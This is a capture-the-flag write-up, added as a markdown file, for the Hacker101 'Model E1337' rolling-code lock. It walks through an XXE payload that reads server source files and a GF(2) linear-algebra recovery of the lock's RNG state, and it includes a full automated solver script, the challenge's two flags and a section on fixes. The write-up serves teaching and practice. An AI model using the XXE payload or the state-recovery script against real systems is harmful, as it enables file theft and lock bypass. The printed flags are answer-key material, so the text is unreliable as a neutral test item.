@@ -1,1 +1,1249 @@
+---
+description: >-
+  Hacker101 Model E1337 writeup covering XXE file read, RNG source disclosure,
+  GF(2) state recovery, rolling-code prediction, and exploit automation.
+---
 
+# Model E1337 - Rolling Code Lock Writeup
+
+## Hacker101 CTF - Model E1337: Rolling Code Lock
+
+### Overview
+
+This machine is called **Model E1337 — Rolling Code Lock**.
+
+My instance URL was:
+
+```
+https://9eea8687ed65b1214897ea5cb0694a3d.ctf.hacker101.com/
+```
+
+The website is a simple rolling-code lock.
+
+It asks for a numeric code:
+
+```
+Code:
+[ submit ]
+```
+
+When I submitted a wrong code, the app leaked the expected code:
+
+```
+Code incorrect.  Expected 35260901
+```
+
+The challenge has two flags.
+
+The first flag comes from reading the application source code with XXE.
+
+The second flag comes from breaking the rolling-code generator, recovering the internal RNG state, predicting the next code, and submitting it.
+
+The final attack chain was:
+
+```
+1. Find the admin/config functionality.
+2. Abuse XML parsing with XXE.
+3. Read /app/main.py.
+4. Get the first flag from the source code.
+5. Read /app/rng.py.
+6. Understand the rolling-code RNG.
+7. Leak two expected codes.
+8. Recover the 64-bit RNG state with GF(2) linear algebra.
+9. Predict the next code.
+10. Submit the predicted code.
+11. Get the second flag.
+```
+
+The two valid flags I got were:
+
+```
+^FLAG^888f547e1ee567998e74fb9d8e451f5083885573d6fb2a14a0b1cb93642298d2$FLAG$
+^FLAG^a5e55b6ba191ded25fcaf2c6bba5b5edd0f5556d96b6b0c53df50d02db8a5c98$FLAG$
+```
+
+***
+
+### Initial Recon
+
+I started by opening the homepage:
+
+```bash
+curl -i https://9eea8687ed65b1214897ea5cb0694a3d.ctf.hacker101.com/
+```
+
+The main page had a form asking for a code.
+
+Then I submitted a random wrong code:
+
+```bash
+curl -X POST \
+  -d "code=1" \
+  https://9eea8687ed65b1214897ea5cb0694a3d.ctf.hacker101.com/unlock
+```
+
+The response was:
+
+```
+Code incorrect.  Expected 35260901
+```
+
+This was already interesting.
+
+The application leaks the expected rolling code when I submit a wrong value.
+
+That means I can collect outputs from the RNG.
+
+But before attacking the RNG, I wanted to understand how the application worked.
+
+***
+
+### Finding the Admin Page
+
+I checked for common routes and found:
+
+```
+/admin
+```
+
+Opening it showed a config-related page.
+
+There were also config endpoints:
+
+```
+/get-config
+/set-config
+```
+
+The config data looked XML-based.
+
+That made me think about XML External Entity injection, also known as XXE.
+
+If the server parses XML insecurely, I may be able to make it read local files.
+
+***
+
+### Testing XML External Entity Injection
+
+The interesting endpoint was:
+
+```
+/set-config
+```
+
+It accepted XML data through a `data` parameter.
+
+So I built an XXE payload.
+
+The payload defined an external entity pointing to a local file:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///app/main.py">
+]>
+<config>
+  <location>
+    &xxe;
+  </location>
+</config>
+```
+
+The idea is:
+
+```
+1. The XML parser sees &xxe;.
+2. It resolves xxe as file:///app/main.py.
+3. The file content gets inserted into the XML.
+4. The admin page displays the config value.
+5. The file content appears in the response.
+```
+
+To make extraction easier, I added markers:
+
+```
+BEGINTAG
+ENDTAG
+```
+
+Final payload:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/main.py"> ]>
+<config>
+  <location>BEGINTAG
+&xxe;
+ENDTAG</location>
+</config>
+```
+
+The request was sent to:
+
+```
+/set-config?data=<xml>
+```
+
+After that, I opened:
+
+```
+/admin
+```
+
+The file content appeared between my markers.
+
+That confirmed XXE.
+
+***
+
+### FLAG0 — Reading `/app/main.py`
+
+Using XXE, I read:
+
+```
+/app/main.py
+```
+
+The command flow was:
+
+```bash
+curl "https://9eea8687ed65b1214897ea5cb0694a3d.ctf.hacker101.com/set-config?data=<XXE_PAYLOAD>"
+curl "https://9eea8687ed65b1214897ea5cb0694a3d.ctf.hacker101.com/admin"
+```
+
+The source code leaked successfully.
+
+The important output started like this:
+
+```python
+from flask import Flask, abort, redirect, request, Response, session
+from jinja2 import Template
+import base64, json, os, random, re, subprocess, time, xml.sax
+from cStringIO import StringIO
+
+from rng import *
+
+# ^FLAG^888f547e1ee567998e74fb9d8e451f5083885573d6fb2a14a0b1cb93642298d2$FLAG$
+```
+
+So the first flag was in a comment inside `main.py`:
+
+```
+^FLAG^888f547e1ee567998e74fb9d8e451f5083885573d6fb2a14a0b1cb93642298d2$FLAG$
+```
+
+***
+
+### What `main.py` Revealed
+
+Reading `main.py` also showed how the unlock logic worked.
+
+The important route was:
+
+```python
+@app.route('/unlock', methods=['POST'])
+def unlock():
+    code = int(request.form['code'])
+    cur = next(26)
+    time.sleep(5)
+
+    if code == cur:
+        return 'Unlocked successfully.  Flag: ' + flags[1]
+    else:
+        return 'Code incorrect.  Expected %08i' % cur
+```
+
+This tells us a lot:
+
+```
+1. The unlock code is generated by next(26).
+2. The server sleeps for 5 seconds after generating the code.
+3. If our submitted code matches, it returns the second flag.
+4. If our submitted code is wrong, it leaks the expected code.
+```
+
+So every wrong unlock attempt leaks one 26-bit RNG output.
+
+This means I can leak multiple outputs and attack the RNG.
+
+***
+
+### Reading `/app/rng.py`
+
+Next, I used the same XXE method to read the RNG source:
+
+```
+/app/rng.py
+```
+
+The leaked file was:
+
+```python
+import random
+
+# 
+
+def setup(seed):
+    global state
+    state = 0
+    for i in xrange(16):
+        cur = seed & 3
+        seed >>= 2
+        state = (state << 4) | ((state & 3) ^ cur)
+        state |= cur << 2
+
+def next(bits):
+    global state
+
+    ret = 0
+    for i in xrange(bits):
+        ret <<= 1
+        ret |= state & 1
+        state = (state << 1) ^ (state >> 61)
+        state &= 0xFFFFFFFFFFFFFFFF
+        state ^= 0xFFFFFFFFFFFFFFFF
+
+        for j in xrange(0, 64, 4):
+            cur = (state >> j) & 0xF
+            cur = (cur >> 3) | ((cur >> 2) & 2) | ((cur << 3) & 8) | ((cur << 2) & 4)
+            state ^= cur << j
+
+    return ret
+
+setup((random.randrange(0x10000) << 16) | random.randrange(0x10000))
+```
+
+The important parts are:
+
+```
+1. The RNG has a 64-bit internal state.
+2. The seed is only 32 bits.
+3. The output is generated one bit at a time.
+4. Each output bit is state & 1.
+5. After each output bit, the state is updated once.
+6. The unlock code uses next(26).
+```
+
+***
+
+### Understanding the RNG Output
+
+The `next(bits)` function builds the return value like this:
+
+```python
+ret <<= 1
+ret |= state & 1
+```
+
+So for `next(26)`, it outputs 26 bits.
+
+The first generated bit becomes the most significant bit of the returned number.
+
+After outputting each bit, the state is updated:
+
+```python
+state = (state << 1) ^ (state >> 61)
+state &= 0xFFFFFFFFFFFFFFFF
+state ^= 0xFFFFFFFFFFFFFFFF
+
+for j in xrange(0, 64, 4):
+    cur = (state >> j) & 0xF
+    cur = (cur >> 3) | ((cur >> 2) & 2) | ((cur << 3) & 8) | ((cur << 2) & 4)
+    state ^= cur << j
+```
+
+At first, this looks complicated.
+
+But the important thing is that it behaves linearly over GF(2).
+
+GF(2) means binary arithmetic:
+
+```
+addition = XOR
+multiplication = AND
+```
+
+So the state transition can be represented as a 64x64 binary matrix.
+
+***
+
+### Leaking Two Codes
+
+Because the unlock route leaks the expected code on failure, I requested two wrong codes.
+
+First leak:
+
+```
+Code incorrect.  Expected 35260901
+```
+
+Binary:
+
+```
+35260901 = 10000110100000100111100101
+```
+
+Second leak:
+
+```
+Code incorrect.  Expected 35471584
+```
+
+Binary:
+
+```
+35471584 = 10000111010100000011100000
+```
+
+Each code gives 26 output bits.
+
+Two codes give:
+
+```
+26 + 26 = 52 output bits
+```
+
+I only need 48 output bits, because I can combine them with 16 state invariant equations:
+
+```
+48 output equations
+16 invariant equations
+---------------------
+64 equations total
+```
+
+That gives enough equations to recover the 64-bit internal state.
+
+***
+
+### State Invariant
+
+The RNG transition creates a useful invariant in every 4-bit nibble.
+
+For each nibble:
+
+```
+bit0 == bit3
+```
+
+In GF(2), equality becomes:
+
+```
+bit0 XOR bit3 = 0
+```
+
+The mask for bit0 and bit3 in a nibble is:
+
+```
+0x9
+```
+
+because:
+
+```
+0x9 = 1001b
+```
+
+For nibble `i`, the equation is:
+
+```python
+0x9 << (4 * i)
+```
+
+There are 16 nibbles in a 64-bit state, so this gives 16 equations:
+
+```python
+for i in range(16):
+    equations.append(0x9 << (4 * i))
+    rhs.append(0)
+```
+
+***
+
+### Building the Transition Matrix
+
+To model the RNG, I built the state transition matrix automatically.
+
+For each bit position `j`, I created a state with only that bit set:
+
+```python
+1 << j
+```
+
+Then I ran one RNG state update.
+
+The output tells me which new state bits depend on that old bit.
+
+```python
+def build_transition_matrix():
+    rows = [0] * 64
+
+    for j in range(64):
+        out = step_inner(1 << j)
+
+        for i in range(64):
+            if (out >> i) & 1:
+                rows[i] |= 1 << j
+
+    return rows
+```
+
+Each row is a 64-bit mask.
+
+The row tells which input state bits XOR together to produce one output state bit.
+
+***
+
+### Building Output Equations
+
+For each output bit, the RNG leaks the current least significant state bit:
+
+```python
+state & 1
+```
+
+So the first output equation is simply:
+
+```python
+cur[0]
+```
+
+After that, the state advances by one transition matrix.
+
+Since this version updates once per output bit, I used `T`, not `T^3`.
+
+The output equations were built like this:
+
+```python
+def build_output_equations(rounds=48):
+    T = build_transition_matrix()
+
+    cur = [1 << i for i in range(64)]
+    equations = []
+
+    for _ in range(rounds):
+        equations.append(cur[0])
+        cur = compose(T, cur)
+
+    return equations
+```
+
+I used 48 output bits:
+
+```
+26 bits from code1
+22 bits from code2
+```
+
+That is done like this:
+
+```python
+bits = f"{code1:026b}" + f"{code2:026b}"
+bits = bits[:48]
+```
+
+***
+
+### Solving Over GF(2)
+
+After building the equations, I had:
+
+```
+16 invariant equations
+48 leaked output equations
+--------------------------
+64 equations total
+```
+
+The unknown was the 64-bit RNG state.
+
+I solved the system using Gaussian elimination over GF(2).
+
+Each row is stored as:
+
+```
+64 coefficient bits | 1 RHS bit
+```
+
+The solver:
+
+```python
+def gf2_solve(equations, rhs, n=64):
+    rows = [
+        equations[i] | (rhs[i] << n)
+        for i in range(len(equations))
+    ]
+
+    r = 0
+    pivots = []
+
+    for col in range(n):
+        pivot = None
+
+        for i in range(r, len(rows)):
+            if (rows[i] >> col) & 1:
+                pivot = i
+                break
+
+        if pivot is None:
+            continue
+
+        rows[r], rows[pivot] = rows[pivot], rows[r]
+
+        for i in range(len(rows)):
+            if i != r and ((rows[i] >> col) & 1):
+                rows[i] ^= rows[r]
+
+        pivots.append(col)
+        r += 1
+
+    for row in rows[r:]:
+        coeffs = row & ((1 << n) - 1)
+        val = (row >> n) & 1
+
+        if coeffs == 0 and val:
+            raise ValueError("linear system is inconsistent")
+
+    if r < n:
+        raise ValueError(f"linear system underdetermined, rank={r}")
+
+    x = 0
+
+    for row, col in zip(rows[:r], pivots):
+        if (row >> n) & 1:
+            x |= 1 << col
+
+    return x
+```
+
+***
+
+### Verifying the Recovered State
+
+The recovered state was:
+
+```
+0xf604dddfb222066d
+```
+
+I verified it by reproducing the two leaked codes.
+
+Output:
+
+```
+[+] Code 1 leaked:      35260901
+[+] Code 1 reproduced: 35260901
+[+] Code 2 leaked:      35471584
+[+] Code 2 reproduced: 35471584
+[+] State verified
+```
+
+This confirmed that the recovered state was correct.
+
+Then I generated the third code:
+
+```
+3436022
+```
+
+I submitted it to `/unlock`.
+
+The server responded:
+
+```
+Unlocked successfully.  Flag: ^FLAG^a5e55b6ba191ded25fcaf2c6bba5b5edd0f5556d96b6b0c53df50d02db8a5c98$FLAG$
+```
+
+So the second flag was recovered.
+
+***
+
+### Full Solver Script
+
+After doing the steps manually and understanding the flow, I wrote a script to automate everything.
+
+The script does:
+
+```
+1. Uses XXE to read /app/main.py.
+2. Extracts the first flag.
+3. Uses XXE to read /app/rng.py.
+4. Requests two wrong unlock codes.
+5. Builds GF(2) equations.
+6. Recovers the internal RNG state.
+7. Verifies the recovered state.
+8. Predicts the next code.
+9. Submits the predicted code.
+10. Extracts the second flag.
+```
+
+```python
+#!/usr/bin/env python3
+import argparse
+import html
+import re
+import sys
+from urllib.parse import urljoin
+
+import requests
+
+
+MASK = 0xFFFFFFFFFFFFFFFF
+DEFAULT_URL = "https://9eea8687ed65b1214897ea5cb0694a3d.ctf.hacker101.com/"
+
+
+def normalize_url(url):
+    url = url.strip()
+
+    if not url.startswith("http://") and not url.startswith("https://"):
+        url = "https://" + url
+
+    if not url.endswith("/"):
+        url += "/"
+
+    return url
+
+
+def extract_flags(text):
+    flags = re.findall(r"\^FLAG\^[A-Za-z0-9]+\$FLAG\$", text)
+    return list(dict.fromkeys(flags))
+
+
+def print_flags(label, flags):
+    print(f"\n[{label}]")
+
+    if not flags:
+        print("[-] No flags found")
+        return
+
+    for flag in flags:
+        print(f"[+] {flag}")
+
+
+def step_inner(state):
+    state = ((state << 1) ^ (state >> 61)) & MASK
+    state ^= MASK
+
+    for j in range(0, 64, 4):
+        cur = (state >> j) & 0xF
+        cur = (
+            (cur >> 3)
+            | ((cur >> 2) & 2)
+            | ((cur << 3) & 8)
+            | ((cur << 2) & 4)
+        )
+        state ^= cur << j
+
+    return state & MASK
+
+
+def rng_next(state, bits=26):
+    ret = 0
+
+    for _ in range(bits):
+        ret <<= 1
+        ret |= state & 1
+        state = step_inner(state)
+
+    return ret, state
+
+
+def build_transition_matrix():
+    rows = [0] * 64
+
+    for j in range(64):
+        out = step_inner(1 << j)
+
+        for i in range(64):
+            if (out >> i) & 1:
+                rows[i] |= 1 << j
+
+    return rows
+
+
+def compose(A, B):
+    C = []
+
+    for row in A:
+        acc = 0
+        x = row
+
+        while x:
+            low = x & -x
+            j = low.bit_length() - 1
+            acc ^= B[j]
+            x ^= low
+
+        C.append(acc)
+
+    return C
+
+
+def build_output_equations(rounds=48):
+    T = build_transition_matrix()
+
+    cur = [1 << i for i in range(64)]
+    equations = []
+
+    for _ in range(rounds):
+        equations.append(cur[0])
+        cur = compose(T, cur)
+
+    return equations
+
+
+def build_live_state_constraints():
+    return [0x9 << (4 * i) for i in range(16)]
+
+
+def gf2_solve(equations, rhs, n=64):
+    rows = [
+        equations[i] | (rhs[i] << n)
+        for i in range(len(equations))
+    ]
+
+    r = 0
+    pivots = []
+
+    for col in range(n):
+        pivot = None
+
+        for i in range(r, len(rows)):
+            if (rows[i] >> col) & 1:
+                pivot = i
+                break
+
+        if pivot is None:
+            continue
+
+        rows[r], rows[pivot] = rows[pivot], rows[r]
+
+        for i in range(len(rows)):
+            if i != r and ((rows[i] >> col) & 1):
+                rows[i] ^= rows[r]
+
+        pivots.append(col)
+        r += 1
+
+    for row in rows[r:]:
+        coeffs = row & ((1 << n) - 1)
+        val = (row >> n) & 1
+
+        if coeffs == 0 and val:
+            raise ValueError("linear system is inconsistent")
+
+    if r < n:
+        raise ValueError(f"linear system underdetermined, rank={r}")
+
+    x = 0
+
+    for row, col in zip(rows[:r], pivots):
+        if (row >> n) & 1:
+            x |= 1 << col
+
+    return x
+
+
+def xxe_read_file(session, base_url, path):
+    print(f"\n[+] XXE reading: {path}")
+
+    xml_payload = f"""<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://{path}"> ]>
+<config>
+  <location>BEGINTAG
+&xxe;
+ENDTAG</location>
+</config>"""
+
+    set_config_url = urljoin(base_url, "set-config")
+    admin_url = urljoin(base_url, "admin")
+
+    r = session.get(
+        set_config_url,
+        params={"data": xml_payload},
+        timeout=25,
+        allow_redirects=False,
+    )
+
+    print(f"[+] /set-config status: {r.status_code}")
+
+    r = session.get(admin_url, timeout=25)
+    print(f"[+] /admin status: {r.status_code}")
+
+    text = html.unescape(r.text)
+
+    m = re.search(r"BEGINTAG\s*(.*?)\s*ENDTAG", text, re.S)
+
+    if not m:
+        print("[-] Could not extract file content with markers")
+        print("[+] Admin preview:")
+        print(text[:1500])
+        return ""
+
+    content = m.group(1)
+
+    print(f"[+] Read {len(content)} bytes from {path}")
+    print("[+] Preview:")
+    print(content[:1200])
+
+    return content
+
+
+def get_expected_code(session, base_url):
+    unlock_url = urljoin(base_url, "unlock")
+
+    print("\n[+] Requesting wrong rolling code leak")
+
+    r = session.post(unlock_url, data={"code": "1"}, timeout=40)
+
+    print(f"[+] /unlock status: {r.status_code}")
+    print(f"[+] Response: {r.text.strip()}")
+
+    m = re.search(r"Expected\s+(\d+)", r.text)
+
+    if not m:
+        raise ValueError("could not extract expected code from response")
+
+    code = int(m.group(1))
+
+    print(f"[+] Leaked code: {code}")
+    print(f"[+] Leaked code binary: {code:026b}")
+
+    return code
+
+
+def recover_state_from_two_codes(code1, code2):
+    print("\n[+] Building GF(2) equations")
+
+    equations = []
+    rhs = []
+
+    for eq in build_live_state_constraints():
+        equations.append(eq)
+        rhs.append(0)
+
+    output_equations = build_output_equations(rounds=48)
+
+    bits = f"{code1:026b}" + f"{code2:026b}"
+    bits = bits[:48]
+
+    for eq, bit in zip(output_equations, bits):
+        equations.append(eq)
+        rhs.append(int(bit))
+
+    print(f"[+] Total equations: {len(equations)}")
+    print("[+] Solving state")
+
+    state = gf2_solve(equations, rhs)
+
+    print(f"[+] Recovered state: 0x{state:016x}")
+
+    return state
+
+
+def unlock_with_predicted_code(session, base_url, code):
+    unlock_url = urljoin(base_url, "unlock")
+
+    print(f"\n[+] Submitting predicted code: {code}")
+
+    r = session.post(unlock_url, data={"code": str(code)}, timeout=40)
+
+    print(f"[+] /unlock status: {r.status_code}")
+    print()
+    print(r.text)
+
+    return r.text
+
+
+def main():
+    parser = argparse.ArgumentParser(description="Hacker101 Model E1337 solver")
+
+    parser.add_argument(
+        "--url",
+        default=DEFAULT_URL,
+        help="Challenge instance URL",
+    )
+
+    args = parser.parse_args()
+
+    base_url = normalize_url(args.url)
+
+    print(f"[+] Target: {base_url}")
+
+    session = requests.Session()
+
+    all_flags = []
+
+    print("\n========== FLAG 0: XXE SOURCE READ ==========")
+
+    main_py = xxe_read_file(session, base_url, "/app/main.py")
+    flags = extract_flags(main_py)
+    print_flags("Flags from /app/main.py", flags)
+    all_flags.extend(flags)
+
+    rng_py = xxe_read_file(session, base_url, "/app/rng.py")
+    flags = extract_flags(rng_py)
+    print_flags("Flags from /app/rng.py", flags)
+    all_flags.extend(flags)
+
+    print("\n========== FLAG 1: ROLLING CODE CRYPTANALYSIS ==========")
+
+    code1 = get_expected_code(session, base_url)
+    code2 = get_expected_code(session, base_url)
+
+    state = recover_state_from_two_codes(code1, code2)
+
+    reproduced1, state_after_1 = rng_next(state, 26)
+    reproduced2, state_after_2 = rng_next(state_after_1, 26)
+
+    print("\n[+] Verifying recovered state")
+    print(f"[+] Code 1 leaked:      {code1}")
+    print(f"[+] Code 1 reproduced: {reproduced1}")
+    print(f"[+] Code 2 leaked:      {code2}")
+    print(f"[+] Code 2 reproduced: {reproduced2}")
+
+    if reproduced1 != code1 or reproduced2 != code2:
+        print("[!] State verification failed.")
+        print("[!] Something is wrong with code extraction or equations.")
+        sys.exit(1)
+
+    print("[+] State verified")
+
+    code3, _ = rng_next(state_after_2, 26)
+
+    result = unlock_with_predicted_code(session, base_url, code3)
+    flags = extract_flags(result)
+    print_flags("Flags from unlock", flags)
+    all_flags.extend(flags)
+
+    all_flags = list(dict.fromkeys(all_flags))
+
+    print("\n==============================")
+    print("[+] ALL FLAGS FOUND")
+    print("==============================")
+
+    if all_flags:
+        for flag in all_flags:
+            print(flag)
+    else:
+        print("[-] No flags found")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+***
+
+### Running the Solver
+
+I saved the script as:
+
+```
+e1337_v1_solver.py
+```
+
+Then I ran:
+
+```bash
+python3 e1337_v1_solver.py --url https://9eea8687ed65b1214897ea5cb0694a3d.ctf.hacker101.com/
+```
+
+The output:
+
+```
+[+] Target: https://9eea8687ed65b1214897ea5cb0694a3d.ctf.hacker101.com/
+
+========== FLAG 0: XXE SOURCE READ ==========
+
+[+] XXE reading: /app/main.py
+[+] /set-config status: 302
+[+] /admin status: 200
+[+] Read 2125 bytes from /app/main.py
+[+] Preview:
+# 
+
+from flask import Flask, abort, redirect, request, Response, session
+from jinja2 import Template
+import base64, json, os, random, re, subprocess, time, xml.sax
+from cStringIO import StringIO
+
+from rng import *
+
+# ^FLAG^888f547e1ee567998e74fb9d8e451f5083885573d6fb2a14a0b1cb93642298d2$FLAG$
+
+[Flags from /app/main.py]
+[+] ^FLAG^888f547e1ee567998e74fb9d8e451f5083885573d6fb2a14a0b1cb93642298d2$FLAG$
+
+[+] XXE reading: /app/rng.py
+[+] /set-config status: 302
+[+] /admin status: 200
+[+] Read 722 bytes from /app/rng.py
+[+] Preview:
+import random
+
+def setup(seed):
+    global state
+    state = 0
+
+def next(bits):
+    global state
+    ret = 0
+    ...
+```
+
+Then the RNG attack:
+
+```
+========== FLAG 1: ROLLING CODE CRYPTANALYSIS ==========
+
+[+] Requesting wrong rolling code leak
+[+] /unlock status: 200
+[+] Response: Code incorrect.  Expected 35260901
+[+] Leaked code: 35260901
+[+] Leaked code binary: 10000110100000100111100101
+
+[+] Requesting wrong rolling code leak
+[+] /unlock status: 200
+[+] Response: Code incorrect.  Expected 35471584
+[+] Leaked code: 35471584
+[+] Leaked code binary: 10000111010100000011100000
+
+[+] Building GF(2) equations
+[+] Total equations: 64
+[+] Solving state
+[+] Recovered state: 0xf604dddfb222066d
+
+[+] Verifying recovered state
+[+] Code 1 leaked:      35260901
+[+] Code 1 reproduced: 35260901
+[+] Code 2 leaked:      35471584
+[+] Code 2 reproduced: 35471584
+[+] State verified
+
+[+] Submitting predicted code: 3436022
+[+] /unlock status: 200
+
+Unlocked successfully.  Flag: ^FLAG^a5e55b6ba191ded25fcaf2c6bba5b5edd0f5556d96b6b0c53df50d02db8a5c98$FLAG$
+```
+
+Final output:
+
+```
+==============================
+[+] ALL FLAGS FOUND
+==============================
+^FLAG^888f547e1ee567998e74fb9d8e451f5083885573d6fb2a14a0b1cb93642298d2$FLAG$
+^FLAG^a5e55b6ba191ded25fcaf2c6bba5b5edd0f5556d96b6b0c53df50d02db8a5c98$FLAG$
+```
+
+***
+
+### Final Flags
+
+```
+^FLAG^888f547e1ee567998e74fb9d8e451f5083885573d6fb2a14a0b1cb93642298d2$FLAG$
+^FLAG^a5e55b6ba191ded25fcaf2c6bba5b5edd0f5556d96b6b0c53df50d02db8a5c98$FLAG$
+```
+
+***
+
+### Why This Worked
+
+The first half worked because the config parser accepted XML with external entities enabled.
+
+That allowed this:
+
+```xml
+<!ENTITY xxe SYSTEM "file:///app/main.py">
+```
+
+to read local files.
+
+The second half worked because the rolling-code RNG was predictable.
+
+The unlock route leaked expected codes on failure:
+
+```
+Code incorrect. Expected ...
+```
+
+Those leaked codes were direct outputs of `next(26)`.
+
+The RNG state transition looked complicated, but it was linear over GF(2).
+
+With two leaked codes, I got enough output bits to build equations and solve for the internal state.
+
+After recovering the state, I predicted the next code and unlocked the flag.
+
+***
+
+### Fix
+
+The XXE issue should be fixed by disabling external entity resolution in the XML parser.
+
+XML parsing should never allow arbitrary external file reads.
+
+The application should also avoid accepting raw XML from users unless absolutely necessary.
+
+For the rolling-code issue:
+
+```
+1. Do not leak expected codes in error messages.
+2. Do not use a custom RNG for security-sensitive codes.
+3. Use cryptographically secure randomness.
+4. Add rate limiting.
+5. Use one-time tokens with expiration.
+```
+
+Bad error message:
+
+```
+Code incorrect. Expected 35260901
+```
+
+Good error message:
+
+```
+Code incorrect.
+```
+
+For secure random codes in Python:
+
+```python
+import secrets
+
+code = secrets.randbits(26)
+```
+
+***
+
+### Summary
+
+The solve path was:
+
+```
+1. Found /admin and config endpoints.
+2. Tested XML config parsing.
+3. Confirmed XXE through /set-config.
+4. Read /app/main.py.
+5. Got the first flag from source code.
+6. Read /app/rng.py.
+7. Saw that unlock uses next(26).
+8. Leaked two wrong expected codes.
+9. Built GF(2) equations from the leaked bits.
+10. Added 16 state invariant equations.
+11. Solved for the 64-bit RNG state.
+12. Verified the state by reproducing both leaked codes.
+13. Predicted the next code.
+14. Submitted it and got the second flag.
+```
+
+The two key bugs were:
+
+```
+XXE file read
+Predictable rolling-code RNG
+```
+
+Together, they gave full source visibility and a working unlock-code prediction.
